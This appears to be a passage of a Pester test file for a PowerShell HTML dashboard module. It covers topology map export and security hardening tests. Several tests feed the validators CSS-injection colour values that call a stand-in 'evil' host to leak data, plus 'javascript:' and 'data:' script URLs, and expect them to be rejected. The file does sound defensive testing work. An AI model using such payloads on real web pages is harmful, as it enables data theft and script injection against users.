    It 'HTML contains topologymap block + renderTopologyMap renderer' {
        $tmp = Join-Path ([IO.Path]::GetTempPath()) ('DH_TmTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmp | Out-Null
        try {
            $nodesAct = $nodes + @{
                Id='dc05'; Label='DC05'; Parent='dom-eu'; Status='ok';
                LinkTableId='incidents'; LinkFilter='dc05'
            }
            Add-DhTopologyMap -Report $report -Id 'tm-export' -Title 'AD Forest' `
                -Nodes $nodesAct -Direction 'vertical'
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'incidents' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmp 'test-topology.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"blockType":"topologymap"'
            $content | Should -Match '"direction":"vertical"'
            $content | Should -Match '"id":"forest"'
            $content | Should -Match '"label":"contoso.com"'
            $content | Should -Match '"status":"danger"'
            $content | Should -Match '"linkTableId":"incidents"'
            $content | Should -Match '"linkFilter":"dc05"'
            $content | Should -Match 'function renderTopologyMap'
        } finally {
            Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ============================================================================
#  v1.5.3 — security hardening
# ============================================================================

Describe 'Security: Add-DhPieChart slice Color validation' {
    BeforeEach {
        $script:report = New-DhDashboard -Title 'sec' -Theme 'Default'
    }
    It 'accepts hex literals (#fff, #ffffff, #ffffffff)' {
        { Add-DhPieChart -Report $script:report -Id 'p1' -Title 't' -Slices @(
            @{ Label='a'; Value=1; Color='#fff'      }
            @{ Label='b'; Value=1; Color='#1B6B35'   }
            @{ Label='c'; Value=1; Color='#1B6B3580' }
        ) } | Should -Not -Throw
    }
    It 'accepts rgb()/rgba()/hsl()/hsla() and var(--token)' {
        { Add-DhPieChart -Report $script:report -Id 'p2' -Title 't' -Slices @(
            @{ Label='a'; Value=1; Color='rgb(10, 20, 30)' }
            @{ Label='b'; Value=1; Color='rgba(0,0,0,0.5)' }
            @{ Label='c'; Value=1; Color='hsl(120,50%,40%)' }
            @{ Label='d'; Value=1; Color='var(--accent-primary)' }
        ) } | Should -Not -Throw
    }
    It 'rejects a CSS-injection payload (semicolon and url())' {
        { Add-DhPieChart -Report $script:report -Id 'p3' -Title 't' -Slices @(
            @{ Label='evil'; Value=1; Color='red; background-image: url(http://evil/log?u=PII)' }
        ) } | Should -Throw -ExpectedMessage '*Add-DhPieChart: slice*Color*not a recognised CSS colour*'
    }
    It 'rejects parentheses outside a recognised function' {
        { Add-DhPieChart -Report $script:report -Id 'p4' -Title 't' -Slices @(
            @{ Label='evil'; Value=1; Color='attr(data-x)' }
        ) } | Should -Throw -ExpectedMessage '*not a recognised CSS colour*'
    }
}

Describe 'Security: Add-DhLineChart series Color validation' {
    BeforeEach {
        $script:report = New-DhDashboard -Title 'sec' -Theme 'Default'
    }
    It 'rejects a CSS-injection payload on a series Color' {
        { Add-DhLineChart -Report $script:report -Id 'l1' -Title 't' `
            -XAxis @('Mon','Tue','Wed') -Series @(
                @{ Label='evil'; Values=@(1,2,3); Color='red;background:url(http://evil/x)' }
            ) } | Should -Throw -ExpectedMessage '*Add-DhLineChart: series*Color*not a recognised CSS colour*'
    }
    It 'accepts a clean hex color' {
        { Add-DhLineChart -Report $script:report -Id 'l2' -Title 't' `
            -XAxis @('Mon','Tue') -Series @(
                @{ Label='clean'; Values=@(1,2); Color='#1B6B35' }
            ) } | Should -Not -Throw
    }
}

Describe 'Security: Add-DhAlertBanner Action.Url scheme validation' {
    BeforeEach {
        $script:report = New-DhDashboard -Title 'sec' -Theme 'Default'
    }
    It 'rejects javascript: URLs' {
        { Add-DhAlertBanner -Report $script:report -Id 'b1' -Severity 'info' `
            -Message 'msg' -Action @{ Label='click'; Url='javascript:alert(1)' } } |
            Should -Throw -ExpectedMessage '*scheme that is not allowed*'
    }
    It 'rejects data: URLs' {
        { Add-DhAlertBanner -Report $script:report -Id 'b2' -Severity 'info' `
            -Message 'msg' -Action @{ Label='click'; Url='data:text/html,<script>alert(1)</script>' } } |
            Should -Throw -ExpectedMessage '*scheme*not allowed*'
    }
    It 'accepts https://, http://, mailto:, tel:, and #anchor' {
        { Add-DhAlertBanner -Report $script:report -Id 'b3' -Severity 'info' `
            -Message 'msg' -Action @{ Label='click'; Url='https://example.com/path' } } | Should -Not -Throw
        { Add-DhAlertBanner -Report $script:report -Id 'b4' -Severity 'info' `
            -Message 'msg' -Action @{ Label='click'; Url='mailto:ops@example.com' } } | Should -Not -Throw
        { Add-DhAlertBanner -Report $script:report -Id 'b5' -Severity 'info' `
            -Message 'msg' -Action @{ Label='click'; Url='#somewhere' } } | Should -Not -Throw
    }
}

Describe 'Security: Add-DhSummary tile Action.Url scheme validation' {
    BeforeEach {
        $script:report = New-DhDashboard -Title 'sec' -Theme 'Default'
    }
    It 'rejects javascript: URLs on tile Actions' {
        { Add-DhSummary -Report $script:report -Items @(
            @{ Label='Total'; Value=1; Action=@{ Label='go'; Url='javascript:alert(1)' } }
        ) } | Should -Throw -ExpectedMessage '*scheme that is not allowed*'
    }
    It 'accepts https tile Action URLs' {
        { Add-DhSummary -Report $script:report -Items @(
            @{ Label='Total'; Value=1; Action=@{ Label='go'; Url='https://intra.example.com/dash' } }
        ) } | Should -Not -Throw
    }
}

Describe 'Security: ConvertTo-DhJsonString line/paragraph separator escaping' {
    # ConvertTo-DhJsonString is a Private helper (not exported), and InModuleScope
    # fails when a previously installed copy of DashHtml is also loaded in the
    # session (e.g. after Publish-Module). Drive the helper through a public sink:
    # we put U+2028 and U+2029 into a Summary tile Label, render the dashboard,
    # and verify the embedded SUMMARY_CONFIG JSON contains the escaped sequences
    # instead of raw line terminators. End-to-end test, immune to InModuleScope.
    BeforeAll {
        $script:srcHtmlSep = $null
        try {
            $rpt = New-DhDashboard -Title 'sec-sep' -Theme 'Default'
            Add-DhSummary -Report $rpt -Items @(
                @{ Label=('ls' + [char]0x2028 + 'tail'); Value=1 }
                @{ Label=('ps' + [char]0x2029 + 'tail'); Value=2 }
            )
            $tmpPath = Join-Path ([System.IO.Path]::GetTempPath()) ("dh_sep_test_$([guid]::NewGuid().ToString('N')).html")
            Export-DhDashboard -Report $rpt -OutputPath $tmpPath -Force | Out-Null
            $script:srcHtmlSep = Get-Content -LiteralPath $tmpPath -Raw
            Remove-Item -LiteralPath $tmpPath -Force -ErrorAction SilentlyContinue
        } catch {
            $script:srcHtmlSep = "ERROR: $($_.ToString())"
        }
    }
    It 'embeds U+2028 as the literal \u2028 escape inside the JS payload' {
        $script:srcHtmlSep | Should -Match 'ls\\u2028tail'
        # Negative: the raw line separator must not survive in the script block
        $script:srcHtmlSep -match ([regex]::Escape('ls' + [char]0x2028 + 'tail')) | Should -BeFalse
    }
    It 'embeds U+2029 as the literal \u2029 escape inside the JS payload' {
        $script:srcHtmlSep | Should -Match 'ps\\u2029tail'
        $script:srcHtmlSep -match ([regex]::Escape('ps' + [char]0x2029 + 'tail')) | Should -BeFalse
    }
}

Describe 'Security: exported HTML pins CDN scripts with SRI' {
    # Build the rendered HTML once at discovery time. Pester 5 runs Discovery and
    # Run in separate phases; computing the export in BeforeAll keeps the It body
    # tiny (and lets us pinpoint the failure if Export-DhDashboard ever changes).
    BeforeAll {
        $script:srcHtmlSri = $null
        try {
            $rpt = New-DhDashboard -Title 'sec' -Theme 'Default'
            Add-DhSummary -Report $rpt -Items @( @{ Label='x'; Value=1 } )
            $tmpPath = Join-Path ([System.IO.Path]::GetTempPath()) ("dh_sri_test_$([guid]::NewGuid().ToString('N')).html")
            Export-DhDashboard -Report $rpt -OutputPath $tmpPath -Force | Out-Null
            $script:srcHtmlSri = Get-Content -LiteralPath $tmpPath -Raw
            Remove-Item -LiteralPath $tmpPath -Force -ErrorAction SilentlyContinue
        } catch {
            $script:srcHtmlSri = "ERROR: $($_.ToString())"
        }
    }
    It 'pins xlsx with sha384 SRI' {
        $script:srcHtmlSri | Should -Match 'xlsx\.full\.min\.js" integrity="sha384-'
    }
    It 'pins jspdf with sha384 SRI' {
        $script:srcHtmlSri | Should -Match 'jspdf\.umd\.min\.js" integrity="sha384-'
    }
    It 'pins jspdf-autotable with sha384 SRI' {
        $script:srcHtmlSri | Should -Match 'jspdf\.plugin\.autotable\.min\.js" integrity="sha384-'
    }
}
